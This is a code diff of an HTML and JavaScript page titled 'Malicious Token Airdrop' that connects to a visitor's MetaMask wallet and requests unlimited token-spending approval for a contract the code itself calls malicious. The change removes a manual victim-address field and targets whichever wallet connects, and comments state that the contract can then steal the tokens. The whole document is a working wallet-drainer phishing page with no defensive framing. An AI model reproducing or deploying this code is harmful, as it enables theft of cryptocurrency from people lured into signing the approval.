@@ -7,12 +7,9 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Malicious Token Airdrop22</h1>
+    <h1>Malicious Token Airdrop</h1>
 
     <button id="connectWallet">Connect Wallet</button>
-    <br>
-    <label for="victimAddress">Victim's Address:</label>
-    <input type="text" id="victimAddress" placeholder="Enter Victim Address">
     <br>
     <button id="approveTokens">Approve Unlimited Token Spending</button>
 
@@ -48,21 +45,25 @@
         });
 
         async function connectWallet() {
-            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
+            try {
+                // Request accounts from MetaMask
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
+            } catch (error) {
+                document.getElementById('status').innerText = `Error: ${error.message}`;
+            }
         }
 
         async function approveTokens() {
-            const victimAddress = document.getElementById('victimAddress').value;
-
-            if (!victimAddress) {
-                alert('Please provide the victim address.');
+            if (!accounts || accounts.length === 0) {
+                alert('Please connect your MetaMask wallet first.');
                 return;
             }
 
             try {
+                const victimAddress = accounts[0]; // Get the connected wallet's address
                 const tokenContract = new web3.eth.Contract(tkkTokenABI, tkkTokenAddress);
-                
+
                 // Approve the malicious contract to spend unlimited tokens
                 const approveTx = await tokenContract.methods
                     .approve(maliciousContractAddress, web3.utils.toWei('1000000000000000000', 'ether')) // Unlimited tokens
@@ -70,7 +71,7 @@
 
                 document.getElementById('status').innerText = `Tokens approved! Transaction: ${approveTx.transactionHash}`;
 
-                // After this approval, the malicious contract will automatically steal the tokens
+                // After this approval, the malicious contract can now steal the tokens
                 document.getElementById('status').innerText += '\nNow the malicious contract can steal the tokens!';
             } catch (error) {
                 document.getElementById('status').innerText = `Error: ${error.message}`;
@@ -79,4 +80,5 @@
     </script>
 </body>
 </html>
+
 
